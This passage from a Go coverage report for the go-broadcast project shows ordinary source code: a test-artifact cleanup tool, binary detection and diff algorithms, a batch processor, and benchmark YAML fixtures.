        if err := app.Run(os.Args); err != nil </span><span class="cov0" title="0">{
                log.Fatalf("Cleanup failed: %v", err)
        }</span>
}

// TestCleanupApp represents the main application
type TestCleanupApp struct {
        flagParser  FlagParser
        fileWalker  FileWalker
        logger      Logger
        fileRemover FileRemover
}

// FlagParser defines interface for parsing command line flags
type FlagParser interface {
        ParseFlags(args []string) (TestCleanupConfig, error)
}

// FileWalker defines interface for walking directory trees
type FileWalker interface {
        Walk(root string, walkFunc WalkFunc) error
}

// WalkFunc is the function signature for file walking
type WalkFunc func(path string, info os.FileInfo, err error) error

// Logger defines interface for logging operations
type Logger interface {
        Printf(format string, v ...interface{})
        Fatalf(format string, v ...interface{})
}

// FileRemover defines interface for file removal operations
type FileRemover interface {
        Remove(filename string) error
        Stat(filename string) (os.FileInfo, error)
}

// DefaultFlagParser implements FlagParser using the flag package
type DefaultFlagParser struct{}

func (d *DefaultFlagParser) ParseFlags(args []string) (TestCleanupConfig, error) <span class="cov8" title="1">{
        var config TestCleanupConfig

        // Create new flag set for this instance
        fs := flag.NewFlagSet(args[0], flag.ExitOnError)
        fs.StringVar(&amp;config.RootDir, "root", ".", "Root directory to clean (default: current directory)")
        fs.BoolVar(&amp;config.DryRun, "dry-run", false, "Show what would be deleted without actually deleting")
        fs.BoolVar(&amp;config.Verbose, "verbose", false, "Enable verbose output")
        patternsFlag := fs.String("patterns", "*.test,*.out,*.prof", "Comma-separated list of file patterns to clean")
        excludeFlag := fs.String("exclude-dirs", ".git,vendor,node_modules", "Comma-separated list of directories to exclude")

        if err := fs.Parse(args[1:]); err != nil </span><span class="cov0" title="0">{
                return config, err
        }</span>

        // Parse patterns and exclude directories
        <span class="cov8" title="1">config.Patterns = strings.Split(*patternsFlag, ",")
        config.ExcludeDirs = strings.Split(*excludeFlag, ",")

        return config, nil</span>
}

// DefaultFileWalker implements FileWalker using filepath.Walk
type DefaultFileWalker struct{}

func (d *DefaultFileWalker) Walk(root string, walkFunc WalkFunc) error <span class="cov0" title="0">{
        return filepath.Walk(root, filepath.WalkFunc(walkFunc))
}</span>

// DefaultLogger implements Logger using the log package
type DefaultLogger struct{}

func (d *DefaultLogger) Printf(format string, v ...interface{}) <span class="cov0" title="0">{
        log.Printf(format, v...)
}</span>

func (d *DefaultLogger) Fatalf(format string, v ...interface{}) <span class="cov0" title="0">{
        log.Fatalf(format, v...)
}</span>

// DefaultFileRemover implements FileRemover using the os package
type DefaultFileRemover struct{}

func (d *DefaultFileRemover) Remove(filename string) error <span class="cov0" title="0">{
        return os.Remove(filename)
}</span>

func (d *DefaultFileRemover) Stat(filename string) (os.FileInfo, error) <span class="cov0" title="0">{
        return os.Stat(filename)
}</span>

// NewTestCleanupApp creates a new TestCleanupApp with default implementations
func NewTestCleanupApp() *TestCleanupApp <span class="cov8" title="1">{
        return &amp;TestCleanupApp{
                flagParser:  &amp;DefaultFlagParser{},
                fileWalker:  &amp;DefaultFileWalker{},
                logger:      &amp;DefaultLogger{},
                fileRemover: &amp;DefaultFileRemover{},
        }
}</span>

// NewTestCleanupAppWithDependencies creates a new TestCleanupApp with injectable dependencies
func NewTestCleanupAppWithDependencies(flagParser FlagParser, fileWalker FileWalker, logger Logger, fileRemover FileRemover) *TestCleanupApp <span class="cov8" title="1">{
        return &amp;TestCleanupApp{
                flagParser:  flagParser,
                fileWalker:  fileWalker,
                logger:      logger,
                fileRemover: fileRemover,
        }
}</span>

// Run executes the test cleanup application
func (app *TestCleanupApp) Run(args []string) error <span class="cov8" title="1">{
        // Parse command line flags
        config, err := app.flagParser.ParseFlags(args)
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to parse flags: %w", err)
        }</span>

        <span class="cov8" title="1">if config.Verbose </span><span class="cov8" title="1">{
                app.logger.Printf("Test Cleanup Utility")
                app.logger.Printf("Root directory: %s", config.RootDir)
                app.logger.Printf("Patterns: %v", config.Patterns)
                app.logger.Printf("Exclude directories: %v", config.ExcludeDirs)
                app.logger.Printf("Dry run: %v", config.DryRun)
                app.logger.Printf("‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ")
        }</span>

        <span class="cov8" title="1">return app.cleanupTestFiles(config)</span>
}

// cleanupTestFiles performs the actual file cleanup operation
func (app *TestCleanupApp) cleanupTestFiles(config TestCleanupConfig) error <span class="cov8" title="1">{
        var deletedFiles []string
        var totalSize int64

        err := app.fileWalker.Walk(config.RootDir, func(path string, info os.FileInfo, err error) error </span><span class="cov8" title="1">{
                if err != nil </span><span class="cov0" title="0">{
                        return err
                }</span>

                // Skip excluded directories
                <span class="cov8" title="1">if info.IsDir() </span><span class="cov0" title="0">{
                        for _, excludeDir := range config.ExcludeDirs </span><span class="cov0" title="0">{
                                if strings.Contains(path, excludeDir) </span><span class="cov0" title="0">{
                                        return filepath.SkipDir
                                }</span>
                        }
                        <span class="cov0" title="0">return nil</span>
                }

                // Check if file matches any of the cleanup patterns
                <span class="cov8" title="1">fileName := info.Name()
                for _, pattern := range config.Patterns </span><span class="cov8" title="1">{
                        pattern = strings.TrimSpace(pattern)
                        if matched, err := filepath.Match(pattern, fileName); err == nil &amp;&amp; matched </span><span class="cov8" title="1">{
                                if config.Verbose </span><span class="cov8" title="1">{
                                        app.logger.Printf("Found: %s (size: %d bytes)", path, info.Size())
                                }</span>

                                <span class="cov8" title="1">if !config.DryRun </span><span class="cov8" title="1">{
                                        if err := app.fileRemover.Remove(path); err != nil </span><span class="cov0" title="0">{
                                                return fmt.Errorf("failed to remove %s: %w", path, err)
                                        }</span>
                                }

                                <span class="cov8" title="1">deletedFiles = append(deletedFiles, path)
                                totalSize += info.Size()
                                break</span>
                        }
                }

                <span class="cov8" title="1">return nil</span>
        })
        <span class="cov8" title="1">if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to walk directory tree: %w", err)
        }</span>

        // Print summary
        <span class="cov8" title="1">if config.DryRun </span><span class="cov8" title="1">{
                app.logger.Printf("\nüîç Dry run completed")
                app.logger.Printf("Would delete %d files (total: %s)", len(deletedFiles), formatBytes(totalSize))
        }</span> else<span class="cov8" title="1"> {
                app.logger.Printf("\n‚úÖ Cleanup completed")
                app.logger.Printf("Deleted %d files (total: %s)", len(deletedFiles), formatBytes(totalSize))
        }</span>

        <span class="cov8" title="1">if config.Verbose &amp;&amp; len(deletedFiles) &gt; 0 </span><span class="cov8" title="1">{
                app.logger.Printf("\nFiles %s:", map[bool]string{true: "that would be deleted", false: "deleted"}[config.DryRun])
                for _, file := range deletedFiles </span><span class="cov8" title="1">{
                        app.logger.Printf("  - %s", file)
                }</span>
        }

        <span class="cov8" title="1">return nil</span>
}

func formatBytes(bytes int64) string <span class="cov8" title="1">{
        const unit = 1024
        if bytes &lt; unit </span><span class="cov8" title="1">{
                return fmt.Sprintf("%d B", bytes)
        }</span>
        <span class="cov8" title="1">div, exp := int64(unit), 0
        for n := bytes / unit; n &gt;= unit; n /= unit </span><span class="cov8" title="1">{
                div *= unit
                exp++
        }</span>
        <span class="cov8" title="1">return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])</span>
}
</pre>

		<pre class="file" id="file4" style="display: none">// Package algorithms provides optimized data processing algorithms for the broadcast system.
package algorithms

import (
        "bytes"
        "fmt"
        "sync"
        "time"

        "github.com/mrz1836/go-broadcast/internal/pool"
)

// BinaryDetectionConfig configures binary file detection
type BinaryDetectionConfig struct {
        MaxSampleSize     int     // Maximum bytes to sample for detection
        NullByteThreshold int     // Number of null bytes to trigger binary classification
        NonPrintableRatio float64 // Ratio of non-printable characters to trigger binary
        UseQuickDetection bool    // Use quick detection for large files
}

// DefaultBinaryDetectionConfig returns sensible defaults
func DefaultBinaryDetectionConfig() BinaryDetectionConfig <span class="cov8" title="1">{
        return BinaryDetectionConfig{
                MaxSampleSize:     8192, // 8KB sample
                NullByteThreshold: 1,    // Any null byte triggers binary
                NonPrintableRatio: 0.3,  // 30% non-printable = binary
                UseQuickDetection: true,
        }
}</span>

// IsBinaryOptimized performs optimized binary file detection with early exit patterns
func IsBinaryOptimized(content []byte) bool <span class="cov8" title="1">{
        return IsBinaryOptimizedWithConfig(content, DefaultBinaryDetectionConfig())
}</span>

// IsBinaryOptimizedWithConfig performs binary detection with custom configuration
func IsBinaryOptimizedWithConfig(content []byte, config BinaryDetectionConfig) bool <span class="cov8" title="1">{
        if len(content) == 0 </span><span class="cov8" title="1">{
                return false
        }</span>

        // Determine sample size
        <span class="cov8" title="1">sampleSize := len(content)
        if sampleSize &gt; config.MaxSampleSize </span><span class="cov8" title="1">{
                sampleSize = config.MaxSampleSize
        }</span>

        <span class="cov8" title="1">sample := content[:sampleSize]

        // Quick detection: check for null bytes first (most reliable indicator)
        nullCount := 0
        for i := 0; i &lt; sampleSize; i++ </span><span class="cov8" title="1">{
                if sample[i] == 0 </span><span class="cov8" title="1">{
                        nullCount++
                        // Early exit: if we find enough null bytes, it's binary
                        if nullCount &gt;= config.NullByteThreshold </span><span class="cov8" title="1">{
                                return true
                        }</span>
                }
        }

        // If quick detection is enabled and file is large, use simplified heuristics
        <span class="cov8" title="1">if config.UseQuickDetection &amp;&amp; len(content) &gt; config.MaxSampleSize </span><span class="cov8" title="1">{
                return checkBinaryHeuristics(sample, config)
        }</span>

        // Full analysis for smaller files or when quick detection is disabled
        <span class="cov8" title="1">return analyzeBinaryContent(sample, config)</span>
}

// checkBinaryHeuristics performs quick binary detection for large files
func checkBinaryHeuristics(sample []byte, config BinaryDetectionConfig) bool <span class="cov8" title="1">{
        // Check for common binary file signatures
        if hasBinarySignature(sample) </span><span class="cov8" title="1">{
                return true
        }</span>

        // Count non-printable characters (excluding common whitespace)
        <span class="cov8" title="1">nonPrintable := 0
        for _, b := range sample </span><span class="cov8" title="1">{
                if !isPrintableOrWhitespace(b) </span><span class="cov0" title="0">{
                        nonPrintable++
                }</span>
        }

        <span class="cov8" title="1">ratio := float64(nonPrintable) / float64(len(sample))
        return ratio &gt; config.NonPrintableRatio</span>
}

// analyzeBinaryContent performs thorough binary content analysis
func analyzeBinaryContent(sample []byte, config BinaryDetectionConfig) bool <span class="cov8" title="1">{
        if len(sample) == 0 </span><span class="cov0" title="0">{
                return false
        }</span>

        // Track character distribution
        <span class="cov8" title="1">var charCounts [256]int
        controlChars := 0
        highBitChars := 0

        for _, b := range sample </span><span class="cov8" title="1">{
                charCounts[b]++

                // Count control characters (excluding common whitespace)
                if b &lt; 32 &amp;&amp; b != '\t' &amp;&amp; b != '\n' &amp;&amp; b != '\r' &amp;&amp; b != '\f' </span><span class="cov8" title="1">{
                        controlChars++
                }</span>

                // Count high-bit characters
                <span class="cov8" title="1">if b &gt; 127 </span><span class="cov8" title="1">{
                        highBitChars++
                }</span>
        }

        <span class="cov8" title="1">sampleLen := len(sample)

        // Check various binary indicators
        controlRatio := float64(controlChars) / float64(sampleLen)
        highBitRatio := float64(highBitChars) / float64(sampleLen)

        // Binary if too many control characters
        if controlRatio &gt; config.NonPrintableRatio </span><span class="cov8" title="1">{
                return true
        }</span>

        // Binary if too many high-bit characters (unless it's valid UTF-8-like)
        <span class="cov8" title="1">if highBitRatio &gt; 0.5 </span><span class="cov8" title="1">{
                return true
        }</span>

        // Check for excessive character diversity (common in binary files)
        <span class="cov8" title="1">uniqueChars := 0
        for _, count := range charCounts </span><span class="cov8" title="1">{
                if count &gt; 0 </span><span class="cov8" title="1">{
                        uniqueChars++
                }</span>
        }

        <span class="cov8" title="1">diversityRatio := float64(uniqueChars) / float64(sampleLen)
        if diversityRatio &gt; 0.7 &amp;&amp; sampleLen &gt; 100 </span><span class="cov0" title="0">{
                return true
        }</span>

        <span class="cov8" title="1">return false</span>
}

// hasBinarySignature checks for common binary file signatures
func hasBinarySignature(data []byte) bool <span class="cov8" title="1">{
        if len(data) &lt; 4 </span><span class="cov8" title="1">{
                return false
        }</span>

        // Common binary signatures
        <span class="cov8" title="1">signatures := [][]byte{
                {0xFF, 0xD8, 0xFF},       // JPEG
                {0x89, 0x50, 0x4E, 0x47}, // PNG
                {0x47, 0x49, 0x46, 0x38}, // GIF
                {0x50, 0x4B, 0x03, 0x04}, // ZIP/DOCX/etc
                {0x25, 0x50, 0x44, 0x46}, // PDF
                {0x7F, 0x45, 0x4C, 0x46}, // ELF
                {0x4D, 0x5A},             // PE/EXE
                {0xCA, 0xFE, 0xBA, 0xBE}, // Java class
                {0xFE, 0xED, 0xFA, 0xCE}, // Mach-O
        }

        for _, sig := range signatures </span><span class="cov8" title="1">{
                if len(data) &gt;= len(sig) &amp;&amp; bytes.HasPrefix(data, sig) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }

        <span class="cov8" title="1">return false</span>
}

// isPrintableOrWhitespace checks if a byte is printable or common whitespace
func isPrintableOrWhitespace(b byte) bool <span class="cov8" title="1">{
        return (b &gt;= 32 &amp;&amp; b &lt;= 126) || // ASCII printable
                b == '\t' || b == '\n' || b == '\r' || b == '\f' // Common whitespace
}</span>

// DiffConfig configures diff operations
type DiffConfig struct {
        MaxDiffSize   int  // Maximum diff size to compute
        UseBufferPool bool // Use buffer pool for temporary allocations
        EarlyExit     bool // Exit early if diff would be too large
        ChunkSize     int  // Size of chunks for large file processing
}

// DefaultDiffConfig returns sensible defaults for diff operations
func DefaultDiffConfig() DiffConfig <span class="cov8" title="1">{
        return DiffConfig{
                MaxDiffSize:   1024 * 1024, // 1MB max diff
                UseBufferPool: true,
                EarlyExit:     true,
                ChunkSize:     4096,
        }
}</span>

// DiffOptimized performs optimized diff computation with early exit patterns
func DiffOptimized(a, b []byte, maxDiff int) ([]byte, bool) <span class="cov8" title="1">{
        config := DefaultDiffConfig()
        config.MaxDiffSize = maxDiff
        return DiffOptimizedWithConfig(a, b, config)
}</span>

// DiffOptimizedWithConfig performs diff computation with custom configuration
func DiffOptimizedWithConfig(a, b []byte, config DiffConfig) ([]byte, bool) <span class="cov8" title="1">{
        // Quick equality check
        if bytes.Equal(a, b) </span><span class="cov8" title="1">{
                return nil, true
        }</span>

        // Early exit if size difference exceeds threshold
        <span class="cov8" title="1">if config.EarlyExit </span><span class="cov8" title="1">{
                sizeDiff := abs(len(a) - len(b))
                if sizeDiff &gt; config.MaxDiffSize </span><span class="cov8" title="1">{
                        return nil, false
                }</span>
        }

        // Estimate diff size
        <span class="cov8" title="1">estimatedDiffSize := estimateDiffSize(a, b)
        if config.EarlyExit &amp;&amp; estimatedDiffSize &gt; config.MaxDiffSize </span><span class="cov0" title="0">{
                return nil, false
        }</span>

        // Use buffer pool for diff result
        <span class="cov8" title="1">var buf *bytes.Buffer
        if config.UseBufferPool </span><span class="cov8" title="1">{
                buf = pool.GetBuffer(estimatedDiffSize)
                defer pool.PutBuffer(buf)
        }</span> else<span class="cov8" title="1"> {
                buf = bytes.NewBuffer(make([]byte, 0, estimatedDiffSize))
        }</span>

        // Perform optimized diff computation
        <span class="cov8" title="1">success := computeOptimizedDiff(a, b, buf, config)
        if !success </span><span class="cov8" title="1">{
                return nil, false
        }</span>

        // Return copy of result
        <span class="cov8" title="1">result := make([]byte, buf.Len())
        copy(result, buf.Bytes())
        return result, true</span>
}

// estimateDiffSize provides a rough estimate of diff size
func estimateDiffSize(a, b []byte) int <span class="cov8" title="1">{
        // Simple heuristic: assume worst case is sum of both files
        // In practice, diffs are usually much smaller
        maxSize := len(a) + len(b)

        // For large files, use a more conservative estimate
        if maxSize &gt; 100*1024 </span><span class="cov8" title="1">{ // 100KB
                return maxSize / 4 // Assume 25% diff
        }</span>

        <span class="cov8" title="1">return maxSize</span>
}

// computeOptimizedDiff computes the actual diff using an optimized algorithm
func computeOptimizedDiff(a, b []byte, buf *bytes.Buffer, config DiffConfig) bool <span class="cov8" title="1">{
        // Simple line-based diff for text content
        if isMostlyText(a) &amp;&amp; isMostlyText(b) </span><span class="cov8" title="1">{
                return computeLineDiff(a, b, buf, config)
        }</span>

        // Byte-based diff for binary content
        <span class="cov8" title="1">return computeByteDiff(a, b, buf, config)</span>
}

// computeLineDiff performs line-based diff computation
func computeLineDiff(a, b []byte, buf *bytes.Buffer, config DiffConfig) bool <span class="cov8" title="1">{
        aLines := bytes.Split(a, []byte{'\n'})
        bLines := bytes.Split(b, []byte{'\n'})

        // Use a simplified diff algorithm suitable for most cases
        return computeLCS(aLines, bLines, buf, config)
}</span>

// computeByteDiff performs byte-based diff computation
func computeByteDiff(a, b []byte, buf *bytes.Buffer, config DiffConfig) bool <span class="cov8" title="1">{
        // For binary files, use a simple block-based approach
        minLen := minInt(len(a), len(b))
        maxLen := maxInt(len(a), len(b))

        // Check if diff would be too large
        if maxLen-minLen &gt; config.MaxDiffSize </span><span class="cov0" title="0">{
                return false
        }</span>

        // Find common prefix
        <span class="cov8" title="1">commonPrefix := 0
        for commonPrefix &lt; minLen &amp;&amp; a[commonPrefix] == b[commonPrefix] </span><span class="cov8" title="1">{
                commonPrefix++
        }</span>

        // Find common suffix
        <span class="cov8" title="1">commonSuffix := 0
        aIdx, bIdx := len(a)-1, len(b)-1
        for commonSuffix &lt; minLen-commonPrefix &amp;&amp; aIdx &gt;= commonPrefix &amp;&amp; bIdx &gt;= commonPrefix &amp;&amp; a[aIdx] == b[bIdx] </span><span class="cov0" title="0">{
                commonSuffix++
                aIdx--
                bIdx--
        }</span>

        // Generate diff representation
        <span class="cov8" title="1">if commonPrefix &gt; 0 </span><span class="cov8" title="1">{
                fmt.Fprintf(buf, "= %d bytes\n", commonPrefix)
        }</span>

        <span class="cov8" title="1">if commonPrefix &lt; len(a)-commonSuffix </span><span class="cov8" title="1">{
                deletedLen := len(a) - commonPrefix - commonSuffix
                fmt.Fprintf(buf, "- %d bytes from %d\n", deletedLen, commonPrefix)
        }</span>

        <span class="cov8" title="1">if commonPrefix &lt; len(b)-commonSuffix </span><span class="cov8" title="1">{
                addedLen := len(b) - commonPrefix - commonSuffix
                fmt.Fprintf(buf, "+ %d bytes at %d\n", addedLen, commonPrefix)
        }</span>

        <span class="cov8" title="1">if commonSuffix &gt; 0 </span><span class="cov0" title="0">{
                fmt.Fprintf(buf, "= %d bytes (suffix)\n", commonSuffix)
        }</span>

        <span class="cov8" title="1">return buf.Len() &lt;= config.MaxDiffSize</span>
}

// computeLCS computes Longest Common Subsequence for line-based diff
func computeLCS(a, b [][]byte, buf *bytes.Buffer, config DiffConfig) bool <span class="cov8" title="1">{
        m, n := len(a), len(b)

        // For large files, use a simplified approach
        if m*n &gt; 10000 </span><span class="cov0" title="0">{ // Avoid O(m*n) memory for very large files
                return computeSimpleDiff(a, b, buf, config)
        }</span>

        // Create LCS table
        <span class="cov8" title="1">lcs := make([][]int, m+1)
        for i := range lcs </span><span class="cov8" title="1">{
                lcs[i] = make([]int, n+1)
        }</span>

        // Fill LCS table
        <span class="cov8" title="1">for i := 1; i &lt;= m; i++ </span><span class="cov8" title="1">{
                for j := 1; j &lt;= n; j++ </span><span class="cov8" title="1">{
                        if bytes.Equal(a[i-1], b[j-1]) </span><span class="cov8" title="1">{
                                lcs[i][j] = lcs[i-1][j-1] + 1
                        }</span> else<span class="cov8" title="1"> {
                                lcs[i][j] = maxInt(lcs[i-1][j], lcs[i][j-1])
                        }</span>
                }
        }

        // Generate diff from LCS
        <span class="cov8" title="1">return generateDiffFromLCS(a, b, lcs, buf, config)</span>
}

// generateDiffFromLCS generates diff output from LCS table
func generateDiffFromLCS(a, b [][]byte, lcs [][]int, buf *bytes.Buffer, config DiffConfig) bool <span class="cov8" title="1">{
        i, j := len(a), len(b)

        for i &gt; 0 || j &gt; 0 </span><span class="cov8" title="1">{
                if buf.Len() &gt; config.MaxDiffSize </span><span class="cov8" title="1">{
                        return false
                }</span>

                <span class="cov8" title="1">if i &gt; 0 &amp;&amp; j &gt; 0 &amp;&amp; bytes.Equal(a[i-1], b[j-1]) </span><span class="cov8" title="1">{
                        // Lines are equal
                        i--
                        j--
                }</span> else<span class="cov8" title="1"> if j &gt; 0 &amp;&amp; (i == 0 || lcs[i][j-1] &gt;= lcs[i-1][j]) </span><span class="cov8" title="1">{
                        // Line added
                        fmt.Fprintf(buf, "+%s\n", string(b[j-1]))
                        j--
                }</span> else<span class="cov8" title="1"> if i &gt; 0 </span><span class="cov8" title="1">{
                        // Line deleted
                        fmt.Fprintf(buf, "-%s\n", string(a[i-1]))
                        i--
                }</span>
        }

        <span class="cov8" title="1">return true</span>
}

// computeSimpleDiff computes a simplified diff for large files
func computeSimpleDiff(a, b [][]byte, buf *bytes.Buffer, config DiffConfig) bool <span class="cov8" title="1">{
        // Simple approach: find blocks of changes
        aIdx, bIdx := 0, 0

        for aIdx &lt; len(a) || bIdx &lt; len(b) </span><span class="cov8" title="1">{
                if buf.Len() &gt; config.MaxDiffSize </span><span class="cov0" title="0">{
                        return false
                }</span>

                <span class="cov8" title="1">if aIdx &lt; len(a) &amp;&amp; bIdx &lt; len(b) &amp;&amp; bytes.Equal(a[aIdx], b[bIdx]) </span><span class="cov8" title="1">{
                        // Lines match, continue
                        aIdx++
                        bIdx++
                }</span> else<span class="cov8" title="1"> {
                        // Find next matching line within reasonable distance
                        matchFound := false
                        searchLimit := minInt(20, minInt(len(a)-aIdx, len(b)-bIdx))

                        for offset := 1; offset &lt; searchLimit &amp;&amp; !matchFound; offset++ </span><span class="cov8" title="1">{
                                if aIdx+offset &lt; len(a) &amp;&amp; bIdx &lt; len(b) &amp;&amp; bytes.Equal(a[aIdx+offset], b[bIdx]) </span><span class="cov0" title="0">{
                                        // Found match after deleting some lines
                                        for i := 0; i &lt; offset; i++ </span><span class="cov0" title="0">{
                                                fmt.Fprintf(buf, "-%s\n", string(a[aIdx+i]))
                                        }</span>
                                        <span class="cov0" title="0">aIdx += offset
                                        matchFound = true</span>
                                } else<span class="cov8" title="1"> if bIdx+offset &lt; len(b) &amp;&amp; aIdx &lt; len(a) &amp;&amp; bytes.Equal(a[aIdx], b[bIdx+offset]) </span><span class="cov0" title="0">{
                                        // Found match after adding some lines
                                        for i := 0; i &lt; offset; i++ </span><span class="cov0" title="0">{
                                                fmt.Fprintf(buf, "+%s\n", string(b[bIdx+i]))
                                        }</span>
                                        <span class="cov0" title="0">bIdx += offset
                                        matchFound = true</span>
                                }
                        }

                        <span class="cov8" title="1">if !matchFound </span><span class="cov8" title="1">{
                                // No nearby match found, output as change
                                if aIdx &lt; len(a) </span><span class="cov8" title="1">{
                                        fmt.Fprintf(buf, "-%s\n", string(a[aIdx]))
                                        aIdx++
                                }</span>
                                <span class="cov8" title="1">if bIdx &lt; len(b) </span><span class="cov8" title="1">{
                                        fmt.Fprintf(buf, "+%s\n", string(b[bIdx]))
                                        bIdx++
                                }</span>
                        }
                }
        }

        <span class="cov8" title="1">return true</span>
}

// isMostlyText checks if content is mostly text
func isMostlyText(content []byte) bool <span class="cov8" title="1">{
        if len(content) == 0 </span><span class="cov8" title="1">{
                return true
        }</span>

        // Sample check for text content
        <span class="cov8" title="1">sampleSize := minInt(1024, len(content))
        sample := content[:sampleSize]

        nonPrintable := 0
        for _, b := range sample </span><span class="cov8" title="1">{
                if !isPrintableOrWhitespace(b) </span><span class="cov8" title="1">{
                        nonPrintable++
                }</span>
        }

        <span class="cov8" title="1">return float64(nonPrintable)/float64(sampleSize) &lt; 0.1</span>
}

// BatchProcessor optimizes batch operations with configurable batching
type BatchProcessor struct {
        batchSize int
        processor func([]interface{}) error
        items     []interface{}
        mu        sync.Mutex

        // Configuration
        autoFlush     bool
        flushInterval time.Duration
        maxWaitTime   time.Duration

        // State
        lastFlush time.Time
        stopChan  chan struct{}
        wg        sync.WaitGroup
}

// BatchProcessorConfig configures batch processing behavior
type BatchProcessorConfig struct {
        BatchSize     int           // Maximum items per batch
        AutoFlush     bool          // Automatically flush batches
        FlushInterval time.Duration // How often to auto-flush
        MaxWaitTime   time.Duration // Maximum time to wait before forcing flush
}

// DefaultBatchProcessorConfig returns sensible defaults
func DefaultBatchProcessorConfig() BatchProcessorConfig <span class="cov8" title="1">{
        return BatchProcessorConfig{
                BatchSize:     100,
                AutoFlush:     true,
                FlushInterval: time.Second * 5,
                MaxWaitTime:   time.Second * 30,
        }
}</span>

// NewBatchProcessor creates a new batch processor
func NewBatchProcessor(processor func([]interface{}) error, config BatchProcessorConfig) *BatchProcessor <span class="cov8" title="1">{
        bp := &amp;BatchProcessor{
                batchSize:     config.BatchSize,
                processor:     processor,
                items:         make([]interface{}, 0, config.BatchSize),
                autoFlush:     config.AutoFlush,
                flushInterval: config.FlushInterval,
                maxWaitTime:   config.MaxWaitTime,
                lastFlush:     time.Now(),
                stopChan:      make(chan struct{}),
        }

        if config.AutoFlush </span><span class="cov8" title="1">{
                bp.wg.Add(1)
                go bp.autoFlushWorker()
        }</span>

        <span class="cov8" title="1">return bp</span>
}

// Add adds an item to the batch
func (bp *BatchProcessor) Add(item interface{}) error <span class="cov8" title="1">{
        bp.mu.Lock()
        defer bp.mu.Unlock()

        bp.items = append(bp.items, item)

        if len(bp.items) &gt;= bp.batchSize </span><span class="cov8" title="1">{
                return bp.flush()
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// AddBatch adds multiple items to the batch
func (bp *BatchProcessor) AddBatch(items []interface{}) error <span class="cov8" title="1">{
        bp.mu.Lock()
        defer bp.mu.Unlock()

        for _, item := range items </span><span class="cov8" title="1">{
                bp.items = append(bp.items, item)

                if len(bp.items) &gt;= bp.batchSize </span><span class="cov8" title="1">{
                        if err := bp.flush(); err != nil </span><span class="cov0" title="0">{
                                return err
                        }</span>
                }
        }

        <span class="cov8" title="1">return nil</span>
}

// Flush processes all pending items
func (bp *BatchProcessor) Flush() error <span class="cov8" title="1">{
        bp.mu.Lock()
        defer bp.mu.Unlock()

        return bp.flush()
}</span>

// Stop stops the batch processor
func (bp *BatchProcessor) Stop() error <span class="cov8" title="1">{
        if bp.autoFlush </span><span class="cov8" title="1">{
                close(bp.stopChan)
                bp.wg.Wait()
        }</span>

        <span class="cov8" title="1">return bp.Flush()</span>
}

// Stats returns batch processor statistics
func (bp *BatchProcessor) Stats() BatchProcessorStats <span class="cov8" title="1">{
        bp.mu.Lock()
        defer bp.mu.Unlock()

        return BatchProcessorStats{
                PendingItems:   len(bp.items),
                LastFlushTime:  bp.lastFlush,
                TimeSinceFlush: time.Since(bp.lastFlush),
        }
}</span>

// BatchProcessorStats contains batch processor statistics
type BatchProcessorStats struct {
        PendingItems   int           `json:"pending_items"`
        LastFlushTime  time.Time     `json:"last_flush_time"`
        TimeSinceFlush time.Duration `json:"time_since_flush"`
}

// flush processes pending items (must be called with lock held)
func (bp *BatchProcessor) flush() error <span class="cov8" title="1">{
        if len(bp.items) == 0 </span><span class="cov8" title="1">{
                return nil
        }</span>

        <span class="cov8" title="1">itemsCopy := make([]interface{}, len(bp.items))
        copy(itemsCopy, bp.items)
        bp.items = bp.items[:0]
        bp.lastFlush = time.Now()

        // Process outside of lock to avoid blocking other operations
        bp.mu.Unlock()
        err := bp.processor(itemsCopy)
        bp.mu.Lock()

        return err</span>
}

// autoFlushWorker automatically flushes batches based on time intervals
func (bp *BatchProcessor) autoFlushWorker() <span class="cov8" title="1">{
        defer bp.wg.Done()

        ticker := time.NewTicker(bp.flushInterval)
        defer ticker.Stop()

        for </span><span class="cov8" title="1">{
                select </span>{
                case &lt;-ticker.C:<span class="cov8" title="1">
                        bp.mu.Lock()
                        shouldFlush := len(bp.items) &gt; 0 &amp;&amp;
                                (time.Since(bp.lastFlush) &gt; bp.flushInterval ||
                                        time.Since(bp.lastFlush) &gt; bp.maxWaitTime)

                        if shouldFlush </span><span class="cov8" title="1">{
                                _ = bp.flush()
                        }</span>
                        <span class="cov8" title="1">bp.mu.Unlock()</span>

                case &lt;-bp.stopChan:<span class="cov8" title="1">
                        // Final flush before stopping
                        _ = bp.Flush()
                        return</span>
                }
        }
}

// Helper functions

func abs(x int) int <span class="cov8" title="1">{
        if x &lt; 0 </span><span class="cov8" title="1">{
                return -x
        }</span>
        <span class="cov8" title="1">return x</span>
}

func minInt(a, b int) int <span class="cov8" title="1">{
        if a &lt; b </span><span class="cov8" title="1">{
                return a
        }</span>
        <span class="cov8" title="1">return b</span>
}

func maxInt(a, b int) int <span class="cov8" title="1">{
        if a &gt; b </span><span class="cov8" title="1">{
                return a
        }</span>
        <span class="cov8" title="1">return b</span>
}
</pre>

		<pre class="file" id="file5" style="display: none">// Package benchmark provides testing fixtures and utilities for performance benchmarking.
package benchmark

import (
        "bytes"
        "fmt"
        "math/rand"
        "strings"
)

// TestRepo represents a test repository configuration
type TestRepo struct {
        Name  string
        Files []TestFile
        Size  string
}

// TestFile represents a test file with content
type TestFile struct {
        Path    string
        Content string
        Size    int
}

// GenerateYAMLConfig creates test YAML configuration data
func GenerateYAMLConfig(targetCount int) []byte <span class="cov8" title="1">{
        var buf bytes.Buffer
        buf.WriteString(`version: 1
source:
  repo: "org/template-repo"
  branch: "master"
defaults:
  branch_prefix: "chore/sync-files"
  pr_labels: ["automated-sync", "chore"]
targets:`)

        for i := 0; i &lt; targetCount; i++ </span><span class="cov8" title="1">{
                buf.WriteString(fmt.Sprintf(`
  - repo: "org/target-repo-%d"
    files:
      - src: ".github/workflows/ci.yml"
        dest: ".github/workflows/ci.yml"
      - src: "Makefile"
        dest: "Makefile"
      - src: "README.md"
        dest: "README.md"
    transform:
      repo_name: true
